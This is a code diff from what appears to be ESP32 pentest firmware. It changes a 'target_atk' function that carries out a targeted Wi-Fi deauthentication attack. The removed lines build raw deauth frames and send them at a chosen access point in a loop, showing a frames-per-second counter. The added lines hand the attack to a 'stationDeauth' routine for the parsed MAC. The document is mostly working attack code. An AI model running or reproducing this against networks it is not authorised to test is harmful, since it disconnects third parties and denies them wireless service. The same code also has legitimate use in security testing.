@@ -650,89 +650,18 @@ AGAIN:
 }
 
 void target_atk(const String &tssid, const String &mac, uint8_t channel) {
-    resetGlobalState();
-    cleanlyStopWebUiForWiFiFeature();
-
-    uint8_t bssid[6];
+    uint8_t mac_array[6];
     sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &bssid[0], &bssid[1], &bssid[2],
-           &bssid[3], &bssid[4], &bssid[5]);
-
-    int actualChannel = channel;
+           &mac_array[0], &mac_array[1], &mac_array[2],
+           &mac_array[3], &mac_array[4], &mac_array[5]);
     
-    if (actualChannel == 0 || actualChannel > 14) {
-        bool found = false;
-        int scannedChannel = getAPChannel(bssid, &found);
-        if (found && scannedChannel > 0 && scannedChannel <= 14) {
-            actualChannel = scannedChannel;
-        } else {
-            actualChannel = 1;
-        }
-    }
-
-    ap_record.primary = actualChannel;
-
-    if (!wifi_atk_setWifi()) return;
-
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    wsl_bypasser_send_raw_frame(&ap_record, actualChannel, _default_target);
-
-    const uint16_t UPDATE_INTERVAL_MS = 2000;
-    const uint8_t FRAMES_PER_SEND = 3;
-
-    uint32_t lastUpdateTime = millis();
-    uint32_t frameCount = 0;
-    bool needsRedraw = true;
-    bool attackActive = true;
-
-    check(SelPress);
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    tft.setTextSize(FM);
-    setCpuFrequencyMhz(CONFIG_ESP_DEFAULT_CPU_FREQ_MHZ);
-
-    while (attackActive) {
-        if (needsRedraw) {
-            drawMainBorderWithTitle("Target Deauth");
-            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-            padprintln("");
-            padprintln("AP: " + tssid);
-            padprintln("Channel: " + String(actualChannel));
-            padprintln(mac);
-            vTaskDelay(50 / portTICK_PERIOD_MS);
-            needsRedraw = false;
-        }
-
-        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-        frameCount += FRAMES_PER_SEND;
-
-        uint32_t currentTime = millis();
-        if (currentTime - lastUpdateTime >= UPDATE_INTERVAL_MS) {
-            uint16_t statusX = tftWidth * 0.05;
-            uint16_t statusY = tftHeight - (tftHeight * 0.08);
-            tft.setCursor(statusX, statusY);
-            float fps = (frameCount * 1000.0) / (currentTime - lastUpdateTime);
-            tft.print("Frames: " + String((int)fps) + "/s   ");
-            frameCount = 0;
-            lastUpdateTime = currentTime;
-        }
-
-        if (check(SelPress) || EscPress) {
-            EscPress = false;
-            displayTextLine("Deauth Paused");
-            delay(500);
-            while (!check(SelPress)) {
-                vTaskDelay(10 / portTICK_PERIOD_MS);
-                if (check(EscPress)) {
-                    attackActive = false;
-                    break;
-                }
-            }
-            needsRedraw = true;
-        }
-    }
-
-    wifi_atk_unsetWifi();
-    returnToMenu = true;
+    eth_addr eth;
+    memcpy(eth.addr, mac_array, 6);
+    ip4_addr_t ip;
+    ip.addr = 0;
+    Host target(&ip, &eth);
+    
+    stationDeauth(target);
 }
 
 void generateRandomWiFiMac(uint8_t *mac) {
